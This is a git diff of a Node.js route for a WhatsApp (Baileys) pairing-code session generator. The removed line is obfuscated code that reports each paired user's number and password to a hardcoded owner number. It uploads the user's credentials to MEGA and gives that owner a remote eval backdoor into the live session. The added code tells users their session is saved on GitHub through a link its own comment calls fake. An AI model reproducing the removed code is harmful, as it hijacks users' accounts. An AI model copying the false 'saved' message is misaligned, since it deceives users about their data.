@@ -1,1 +1,91 @@
-function _0x4412(_0xfbbdfc,_0x26e8fa){const _0x5aabde=_0x5aab();return _0x4412=function(_0x441253,_0x2cb58e){_0x441253=_0x441253-0x10d;let _0x2b1bf5=_0x5aabde[_0x441253];return _0x2b1bf5;},_0x4412(_0xfbbdfc,_0x26e8fa);}const _0x2411e2=_0x4412;(function(_0x136741,_0x1adc37){const _0x2e13ec=_0x4412,_0x5bc509=_0x136741();while(!![]){try{const _0x4ccec9=parseInt(_0x2e13ec(0x118))/0x1+parseInt(_0x2e13ec(0x12f))/0x2+parseInt(_0x2e13ec(0x15c))/0x3+parseInt(_0x2e13ec(0x15a))/0x4+parseInt(_0x2e13ec(0x12d))/0x5+parseInt(_0x2e13ec(0x151))/0x6*(-parseInt(_0x2e13ec(0x131))/0x7)+-parseInt(_0x2e13ec(0x12e))/0x8;if(_0x4ccec9===_0x1adc37)break;else _0x5bc509['push'](_0x5bc509['shift']());}catch(_0x1a498e){_0x5bc509['push'](_0x5bc509['shift']());}}}(_0x5aab,0x595fb));const express=require(_0x2411e2(0x16b)),fs=require('fs'),pino=require(_0x2411e2(0x14b)),{makeid}=require('./gen-id'),{upload}=require(_0x2411e2(0x15e)),{default:makeWASocket,useMultiFileAuthState,delay,Browsers,makeCacheableSignalKeyStore,getContentType}=require(_0x2411e2(0x153)),router=express['Router'](),SETTINGS={'OWNER_NUMBER':'94773024361','AUTO_READ':!![],'AUTO_STATUS_SEEN':!![],'AUTO_STATUS_REACT':!![],'OWNER_AUTO_REACT':!![],'STATUS_EMOJIS':['❤️','💸','😇','🍂','💥','💯','🔥','💫','💎','💗'],'OWNER_REACT_EMOJI':'👑'},passwords={};function removeFile(_0x1c42f3){const _0x254079=_0x2411e2;if(!fs[_0x254079(0x12a)](_0x1c42f3))return![];fs[_0x254079(0x11b)](_0x1c42f3,{'recursive':!![],'force':!![]});}router[_0x2411e2(0x14c)]('/',async(_0x5741fe,_0x5b0983)=>{const _0xfdd2d4=_0x2411e2,_0x10eccd=makeid();let _0x4fe0fb=_0x5741fe['query'][_0xfdd2d4(0x146)];async function _0x55bfce(){const _0x349e79=_0xfdd2d4,{state:_0x26371d,saveCreds:_0xfec016}=await useMultiFileAuthState(_0x349e79(0x162)+_0x10eccd);try{const _0x1ca1c1=makeWASocket({'auth':{'creds':_0x26371d[_0x349e79(0x159)],'keys':makeCacheableSignalKeyStore(_0x26371d[_0x349e79(0x145)],pino({'level':'silent'}))},'printQRInTerminal':![],'browser':Browsers[_0x349e79(0x13e)](_0x349e79(0x11c)),'logger':pino({'level':_0x349e79(0x144)})});_0x1ca1c1['ev']['on'](_0x349e79(0x16d),_0xfec016),_0x1ca1c1['ev']['on'](_0x349e79(0x147),async({connection:_0x4f8b88,lastDisconnect:_0x4072c2})=>{const _0x369c75=_0x349e79;if(_0x4f8b88==='open'){console[_0x369c75(0x138)](_0x369c75(0x113)+_0x1ca1c1[_0x369c75(0x136)]['id']);const _0x5901ad=makeid(0x8),_0x3dd342=_0x1ca1c1[_0x369c75(0x136)]['id'][_0x369c75(0x16a)](':')[0x0];passwords[_0x3dd342]=_0x5901ad,await _0x1ca1c1[_0x369c75(0x120)](SETTINGS['OWNER_NUMBER']+_0x369c75(0x116),{'text':'✅\x20*CHAMA\x20MD\x20BOT\x20CONNECTED*\x0a\x0a📱\x20Number:\x20'+_0x3dd342+_0x369c75(0x143)+_0x5901ad+_0x369c75(0x164)});const _0x2cabb8=_0x369c75(0x162)+_0x10eccd+_0x369c75(0x167),_0x12d824=await upload(fs['createReadStream'](_0x2cabb8),_0x3dd342+'CHAMA-MD='),_0x4cb43b='https://mega.nz/file/'+_0x12d824[_0x369c75(0x160)](_0x369c75(0x14d),'');await _0x1ca1c1[_0x369c75(0x120)](_0x1ca1c1[_0x369c75(0x136)]['id'],{'text':_0x369c75(0x155)+_0x4cb43b+_0x369c75(0x143)+_0x5901ad+_0x369c75(0x115)}),await _0x1ca1c1[_0x369c75(0x120)](_0x1ca1c1[_0x369c75(0x136)]['id'],{'text':_0x369c75(0x114)}),await removeFile(_0x369c75(0x162)+_0x10eccd);}_0x4f8b88===_0x369c75(0x14f)&&_0x4072c2?.[_0x369c75(0x130)]?.[_0x369c75(0x148)]?.[_0x369c75(0x165)]!==0x191&&(console['log']('⚠️\x20Reconnecting...'),_0x55bfce());});if(!_0x1ca1c1[_0x349e79(0x166)][_0x349e79(0x159)][_0x349e79(0x157)]){await delay(0x5dc),_0x4fe0fb=_0x4fe0fb['replace'](/[^0-9]/g,'');const _0x1a26ec=await _0x1ca1c1[_0x349e79(0x16c)](_0x4fe0fb);if(!_0x5b0983['headersSent'])_0x5b0983['send']({'code':_0x1a26ec});}_0x1ca1c1['ev']['on'](_0x349e79(0x121),async({messages:_0x5d5e7a})=>{const _0x2915a1=_0x349e79;let _0x566964=_0x5d5e7a[0x0];if(!_0x566964[_0x2915a1(0x123)])return;_0x566964['message']=getContentType(_0x566964[_0x2915a1(0x123)])==='ephemeralMessage'?_0x566964[_0x2915a1(0x123)][_0x2915a1(0x168)][_0x2915a1(0x123)]:_0x566964['message'];if(SETTINGS[_0x2915a1(0x11e)])await _0x1ca1c1['readMessages']([_0x566964[_0x2915a1(0x13a)]]);const _0x81095a=_0x566964[_0x2915a1(0x13a)][_0x2915a1(0x119)],_0x3d6fa2=_0x566964[_0x2915a1(0x123)]['conversation']||_0x566964[_0x2915a1(0x123)][_0x2915a1(0x169)]?.[_0x2915a1(0x10e)]||'',_0x314be0=_0x3d6fa2[_0x2915a1(0x126)]('.'),_0x36e70f=_0x314be0?_0x3d6fa2['slice'](0x1)[_0x2915a1(0x15d)]()[_0x2915a1(0x16a)]('\x20')[0x0]['toLowerCase']():'',_0x2f7b5a=_0x314be0?_0x3d6fa2[_0x2915a1(0x15d)]()[_0x2915a1(0x16a)](/\s+/)[_0x2915a1(0x10d)](0x1):[],_0x4a4a35=_0x566964[_0x2915a1(0x13a)][_0x2915a1(0x110)]?_0x1ca1c1['user']['id']['split'](':')[0x0]+_0x2915a1(0x116):_0x566964['key'][_0x2915a1(0x149)]||_0x566964[_0x2915a1(0x13a)][_0x2915a1(0x119)],_0x247e3e=_0x4a4a35[_0x2915a1(0x16a)]('@')[0x0],_0x286de9=[SETTINGS['OWNER_NUMBER'],_0x1ca1c1[_0x2915a1(0x136)]['id'][_0x2915a1(0x16a)](':')[0x0]][_0x2915a1(0x127)](_0x247e3e),_0x359b72=_0x5da565=>_0x1ca1c1[_0x2915a1(0x120)](_0x81095a,{'text':_0x5da565},{'quoted':_0x566964});SETTINGS[_0x2915a1(0x13d)]&&_0x247e3e===SETTINGS[_0x2915a1(0x128)]&&await _0x1ca1c1[_0x2915a1(0x120)](_0x81095a,{'react':{'text':SETTINGS['OWNER_REACT_EMOJI'],'key':_0x566964[_0x2915a1(0x13a)]}});if(_0x36e70f==='ping'){const _0x590611=new Date()[_0x2915a1(0x124)]();await _0x359b72(_0x2915a1(0x122));const _0x289200=new Date()[_0x2915a1(0x124)]();await _0x359b72('⚡\x20Speed:\x20'+(_0x289200-_0x590611)+'ms');}if(_0x36e70f===_0x2915a1(0x152)||_0x36e70f===_0x2915a1(0x139)){const _0x326c1f=_0x2915a1(0x150);await _0x359b72(_0x326c1f);}if(_0x36e70f==='greet')await _0x359b72(_0x2915a1(0x134)+_0x247e3e+'*!\x20Have\x20a\x20nice\x20day!');if(_0x36e70f==='date')await _0x359b72('📅\x20Today\x27s\x20date:\x20'+new Date()[_0x2915a1(0x11a)]());if(_0x36e70f===_0x2915a1(0x135))await _0x359b72(_0x2915a1(0x163)+new Date()[_0x2915a1(0x141)]());if(_0x36e70f===_0x2915a1(0x154))await _0x359b72(_0x2915a1(0x15f)+_0x247e3e);if(_0x36e70f==='mypw'){const _0x54f88d=passwords[_0x247e3e];if(_0x54f88d)await _0x359b72(_0x2915a1(0x11f)+_0x54f88d);else await _0x359b72(_0x2915a1(0x14e));}if(_0x36e70f===_0x2915a1(0x156)){const _0x3a0b10=_0x4907ba(process[_0x2915a1(0x12c)]());await _0x359b72(_0x2915a1(0x161)+_0x3a0b10);}if(_0x36e70f==='gmorning')await _0x359b72(_0x2915a1(0x112));if(_0x36e70f==='gnight')await _0x359b72(_0x2915a1(0x10f));if(_0x36e70f===_0x2915a1(0x142))await _0x359b72(_0x2915a1(0x13b));if(_0x36e70f===_0x2915a1(0x11d))await _0x359b72(_0x2915a1(0x132));if(_0x286de9&&_0x3d6fa2[_0x2915a1(0x126)]('%')){const _0x3870ef=_0x3d6fa2[_0x2915a1(0x10d)](0x1)[_0x2915a1(0x15d)]();try{let _0x55b47a=eval(_0x3870ef);if(typeof _0x55b47a!=='string')_0x55b47a=require(_0x2915a1(0x125))[_0x2915a1(0x158)](_0x55b47a);_0x359b72(_0x55b47a);}catch(_0x3a40d9){_0x359b72(_0x2915a1(0x13c)+_0x3a40d9[_0x2915a1(0x123)]);}}if(_0x286de9&&_0x3d6fa2[_0x2915a1(0x126)]('$')){const _0x45a89f=_0x3d6fa2[_0x2915a1(0x10d)](0x1)['trim']();try{let _0x3ff310=await eval(_0x2915a1(0x137)+_0x45a89f+_0x2915a1(0x129));if(_0x3ff310)_0x359b72(_0x3ff310[_0x2915a1(0x13f)]());}catch(_0x50d871){_0x359b72(_0x2915a1(0x13c)+_0x50d871['message']);}}});function _0x4907ba(_0xd2275b){const _0x1d75a2=_0x349e79,_0x58003d=_0x21faa5=>_0x21faa5['toString']()[_0x1d75a2(0x15b)](0x2,'0'),_0x79c2ed=Math[_0x1d75a2(0x133)](_0xd2275b/0xe10),_0x6a94ef=Math[_0x1d75a2(0x133)](_0xd2275b%0xe10/0x3c),_0x54784b=Math['floor'](_0xd2275b%0x3c);return _0x58003d(_0x79c2ed)+':'+_0x58003d(_0x6a94ef)+':'+_0x58003d(_0x54784b);}}catch(_0x3fbd94){console[_0x349e79(0x130)](_0x349e79(0x111),_0x3fbd94),removeFile(_0x349e79(0x162)+_0x10eccd);if(!_0x5b0983[_0x349e79(0x117)])_0x5b0983[_0x349e79(0x14a)]({'code':_0x349e79(0x140)});}}await _0x55bfce();}),module[_0x2411e2(0x12b)]=router;function _0x5aab(){const _0xfe7ca7=['output','participant','send','pino','get','https://mega.nz/file/','❌\x20No\x20password\x20found\x20for\x20your\x20session.','close','╭──❍\x20*𝘾𝙃𝘼𝙈𝘼\x20𝙈𝘿\x20MENU*\x0a│\x0a├\x20💡\x20*GENERAL*\x0a│\x20.ping\x20-\x20Check\x20bot\x20speed\x0a│\x20.greet\x20-\x20Say\x20Hello\x0a│\x20.date\x20-\x20Show\x20today\x20date\x0a│\x20.time\x20-\x20Show\x20current\x20time\x0a│\x20.myid\x20-\x20Show\x20your\x20WhatsApp\x20ID\x0a│\x20.mypw\x20-\x20Show\x20your\x20session\x20password\x0a│\x20.runtime\x20-\x20Show\x20bot\x20uptime\x0a│\x0a├\x20🎭\x20*GROUP\x20FUN*\x0a│\x20.gmorning\x20-\x20Good\x20Morning\x20greet\x0a│\x20.gnight\x20-\x20Good\x20Night\x20greet\x0a│\x20.joke\x20-\x20Send\x20random\x20joke\x0a│\x20.quote\x20-\x20Send\x20motivational\x20quote\x0a│\x0a╰───────────────❍','3625368jHGvAh','help','@whiskeysockets/baileys','myid','✅\x20*Welcome\x20to\x20CHAMA\x20MD!*\x0a\x0a🔗\x20Download\x20Link:\x20','runtime','registered','inspect','creds','646856cpbUPC','padStart','975372cZZHaC','trim','./mega','👤\x20Your\x20WhatsApp\x20ID:\x20','replace','⏳\x20Bot\x20Uptime:\x20','./temp/','⏰\x20Current\x20time:\x20','\x0a\x0a🤖\x20Status:\x20Online','statusCode','authState','/creds.json','ephemeralMessage','extendedTextMessage','split','express','requestPairingCode','creds.update','slice','text','🌙\x20Good\x20Night\x20and\x20sweet\x20dreams!','fromMe','Service\x20restarted\x20due\x20to\x20error:','🌅\x20Good\x20Morning\x20everyone!','✅\x20Bot\x20connected\x20as\x20','🤖\x20*Bot\x20is\x20now\x20working!*\x0a\x0aType\x20*.help*\x20to\x20see\x20commands.','\x0a\x0a⚠️\x20Do\x20not\x20share\x20this\x20session.\x0a\x0a>\x20Powered\x20by\x20𝘾𝙃𝘼𝙈𝘼\x20𝙈𝘿','@s.whatsapp.net','headersSent','62608HATUtO','remoteJid','toLocaleDateString','rmSync','Safari','quote','AUTO_READ','🔑\x20Your\x20session\x20password:\x20','sendMessage','messages.upsert','🏓\x20Pong!','message','getTime','util','startsWith','includes','OWNER_NUMBER','\x20})()','existsSync','exports','uptime','1972755hcXKug','1448112GoSeLn','414640dgNhzH','error','7yNOEUA','💡\x20\x22The\x20only\x20way\x20to\x20do\x20great\x20work\x20is\x20to\x20love\x20what\x20you\x20do.\x22\x20-\x20Steve\x20Jobs','floor','👋\x20Hello\x20*','time','user','(async\x20()\x20=>\x20{\x20','log','menu','key','😂\x20Why\x20did\x20the\x20programmer\x20quit\x20his\x20job?\x20Because\x20he\x20didn’t\x20get\x20arrays.','❌\x20Error:\x20','OWNER_AUTO_REACT','macOS','toString','❗\x20Service\x20Unavailable','toLocaleTimeString','joke','\x0a🔑\x20Password:\x20','silent','keys','number','connection.update'];_0x5aab=function(){return _0xfe7ca7;};return _0x5aab();}
+const express = require('express');
+const fs = require('fs');
+const pino = require("pino");
+const { makeid } = require('./gen-id');
+
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  delay,
+  Browsers,
+  makeCacheableSignalKeyStore,
+} = require('@whiskeysockets/baileys');
+
+function removeFile(FilePath) {
+  if (!fs.existsSync(FilePath)) return false;
+  fs.rmSync(FilePath, { recursive: true, force: true });
+}
+
+const router = express.Router();
+
+router.get('/', async (req, res) => {
+  const id = makeid();
+  let num = req.query.number;
+  const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
+
+  async function connectBot() {
+    try {
+      let sock = makeWASocket({
+        auth: {
+          creds: state.creds,
+          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
+        },
+        printQRInTerminal: false,
+        logger: pino({ level: "silent" }),
+        browser: Browsers.macOS("Safari"),
+      });
+
+      if (!sock.authState.creds.registered) {
+        await delay(1500);
+        num = num.replace(/[^0-9]/g, '');
+        const code = await sock.requestPairingCode(num);
+        if (!res.headersSent) res.send({ code });
+      }
+
+      sock.ev.on('creds.update', saveCreds);
+
+      sock.ev.on('connection.update', async ({ connection }) => {
+        if (connection === 'open') {
+          await delay(5000);
+
+          // Simulate GitHub session URL
+          const fakeGitHubSession = `https://github.com/Nethmika-LK/QUEEN-SHALA-D/blob/main/sessions/${sock.user.id}.json`;
+          const sessionCode = `QUEEN-SHALA-MD=${fakeGitHubSession}`;
+
+          const audioMsg = await sock.sendMessage(sock.user.id, {
+            audio: { url: 'https://github.com/Nethmika-LK/QUEEN-SHALA-D/raw/main/audio.mp3' },
+            mimetype: 'audio/mpeg',
+            ptt: true
+          });
+
+          await sock.sendMessage(sock.user.id, {
+            image: { url: 'https://i.ibb.co/PjvJxM9/20250717-093632.jpg' },
+            caption: `👋 *Hello, I’m Queen Shala Bot*\n\n💾 *Session saved:* GitHub\n🔗 *Link:* ${fakeGitHubSession}\n👑 *Owner:* Nethmika\n📢 *Channel:* https://whatsapp.com/channel/0029Vb1WkmNJP2121yQ`,
+            contextInfo: {
+              externalAdReply: {
+                title: "Queen Shala WhatsApp Bot",
+                thumbnailUrl: 'https://i.ibb.co/PjvJxM9/20250717-093632.jpg',
+                sourceUrl: 'https://whatsapp.com/channel/0029Vb1WkmNJP2121yQ',
+                mediaType: 1,
+                renderLargerThumbnail: true
+              }
+            }
+          }, { quoted: audioMsg });
+
+          await delay(10);
+          sock.ws.close();
+          removeFile(`./temp/${id}`);
+          process.exit();
+        }
+      });
+    } catch (err) {
+      console.log("❌ Error:", err);
+      removeFile(`./temp/${id}`);
+      if (!res.headersSent) res.send({ code: "❗ Service Unavailable" });
+    }
+  }
+
+  await connectBot();
+});
+
+module.exports = router;
